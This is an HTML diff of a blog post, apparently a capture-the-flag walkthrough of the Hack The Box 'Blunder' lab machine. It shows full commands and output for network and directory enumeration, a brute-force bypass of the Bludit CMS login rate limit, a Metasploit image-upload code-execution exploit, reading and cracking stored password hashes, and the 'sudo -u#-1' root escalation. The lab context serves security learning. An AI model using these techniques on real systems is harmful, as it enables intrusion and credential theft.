@@ -5,7 +5,7 @@
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
 <meta name=author content="Nasef">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
 <link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
 <link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
@@ -60,7 +60,7 @@ Contact Me
 <p>Blunder is a machine in which I used an enumration and a multiple cms exploits to get a shell and then enumeration and another exploit to get root Access.</p>
 <h3 id=scanning>Scanning</h3>
 <p>As always, I started scanning with Nmap</p>
-<pre><code>root@kali:/home/kali# nmap -sC -sV 10.10.10.191
+<pre tabindex=0><code>root@kali:/home/kali# nmap -sC -sV 10.10.10.191
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 10:15 EDT
 Nmap scan report for blunder.htb (10.10.10.191)
 Host is up (0.16s latency).
@@ -78,7 +78,7 @@ Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds
 </code></pre><p>Http open and ftp closed.</p>
 <h3 id=directory-enumeration>Directory Enumeration</h3>
 <p>Then I enumerated directories and files using gobuster</p>
-<pre><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u blunder.htb -e txt,php,html
+<pre tabindex=0><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u blunder.htb -e txt,php,html
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -99,7 +99,7 @@ http://blunder.htb/admin (Status: 301)
 http://blunder.htb/usb (Status: 200)
 http://blunder.htb/LICENSE (Status: 200)
 </code></pre><p>Found admin directory which contains a login page. then used wfuzz to enumerate directories</p>
-<pre><code>kali@kali:~$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 http://10.10.10.191/FUZZ.txt
+<pre tabindex=0><code>kali@kali:~$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 http://10.10.10.191/FUZZ.txt
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
@@ -123,16 +123,16 @@ Filtered Requests: 4656
 Requests/sec.: 21.09785
 
 </code></pre><p>Found todo.txt so I opened it and found a user called fergus</p>
-<pre><code>-Update the CMS
+<pre tabindex=0><code>-Update the CMS
 -Turn off FTP - DONE
 -Remove old users - DONE
 -Inform fergus that the new blog needs images - PENDING
 </code></pre><h3 id=bruteforce>Bruteforce</h3>
 <p>The Login Page It contains rate limit so I searched for an exploit to bypass Rate limit and found <a href=https://raw.githubusercontent.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/master/bruteforce.py>Exploit</a></p>
 <p>If you tried the rockyou list it won&rsquo;t work so I used cewl</p>
-<pre><code>cewl http://10.10.10.191
+<pre tabindex=0><code>cewl http://10.10.10.191
 </code></pre><p>then used the exploit</p>
-<pre><code>kali@kali:~/Desktop/blunder2$ python exploit.py 10.10.10.191 fergus wordlist 
+<pre tabindex=0><code>kali@kali:~/Desktop/blunder2$ python exploit.py 10.10.10.191 fergus wordlist 
 [*] Trying: CeWL 5.4.7 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
 [*] Trying: the
 ....
@@ -143,7 +143,7 @@ Use fergus:RolandDeschain to login.
 
 </code></pre><h3 id=exploit>Exploit</h3>
 <p>I searched for an exploits for bludit in metasploit and found one</p>
-<pre><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec 
+<pre tabindex=0><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec 
 msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set RHOSTS 10.10.10.191
 RHOSTS =&gt; 10.10.10.191
 msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set BLUDITPASS RolandDeschain
@@ -163,7 +163,7 @@ msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
 
 </code></pre><h3 id=from-web-to-hugo>From Web to Hugo</h3>
 <p>I started enumeration and found an interesting credentials in</p>
-<pre><code>cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
+<pre tabindex=0><code>cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
 &lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
 {
     &quot;admin&quot;: {
@@ -188,12 +188,12 @@ msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
 </code></pre><p>So, I started cracking the hash
 <img src=/images/blog/007/1.png alt=Username></p>
 <p>then started su to hugo</p>
-<pre><code>su hugo              
+<pre tabindex=0><code>su hugo              
 Password: Password120
 whoami
 hugo
 </code></pre><p>Then tried to try sudo -l</p>
-<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+<pre tabindex=0><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -l
 sudo -l
 Password: Password120
@@ -205,7 +205,7 @@ Matching Defaults entries for hugo on blunder:
 User hugo may run the following commands on blunder:
     (ALL, !root) /bin/bash
 </code></pre><p>I tried to bypass the this sudo permissions to run /bin/bash using this <a href=https://www.exploit-db.com/exploits/47502>Exploit</a></p>
-<pre><code>hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash
+<pre tabindex=0><code>hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash
 &lt;-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash       
 root@blunder:/var/www/bludit-3.10.0a/bl-content/databases#  
 
